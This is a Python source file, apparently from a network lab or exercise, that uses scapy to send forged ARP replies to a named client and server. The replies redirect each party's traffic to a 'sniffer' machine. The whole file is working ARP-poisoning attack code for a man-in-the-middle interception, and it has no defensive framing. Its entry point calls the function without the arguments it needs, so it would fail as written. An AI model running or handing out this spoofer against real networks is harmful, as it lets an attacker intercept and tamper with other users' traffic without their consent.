import time, logging
from scapy.all import ARP, sendp, Ether, get_if_hwaddr


def run_spoofer(interface, ip_dist, logger):
  for ip, info in ip_dist.items():
    if info['name'] == 'client':
      client_ip = ip
      client_mac = info['mac']
    elif info['name'] == 'server':
      server_ip = ip
      server_mac = info['mac']
    elif info['name'] == 'sniffer':
      sniffer_mac = info['mac']

  # To client (server's MAC -> my MAC)
  arp_to_client = Ether(dst=client_mac) / ARP(
    op=2,
    pdst=client_ip,
    hwdst=client_mac,
    psrc=server_ip,
    hwsrc=sniffer_mac
  )
  # To server
  arp_to_server = Ether(dst=server_mac) / ARP(
    op=2,
    pdst=server_ip,
    hwdst=server_mac,
    psrc=client_ip,
    hwsrc=sniffer_mac
  )
  logger.info("[+] Started sending spoofed ARP replies in the background.")

  try:
    for i in range(10):
      sendp(arp_to_client, iface=interface, verbose=False)
      sendp(arp_to_server, iface=interface, verbose=False)
      time.sleep(2)
    logger.info("[+] Complete to send 10 spoofed ARP replies.")
  except KeyboardInterrupt:
      logger.info("[*] Stopping ARP poisoner.")

if __name__ == "__main__":
   run_spoofer()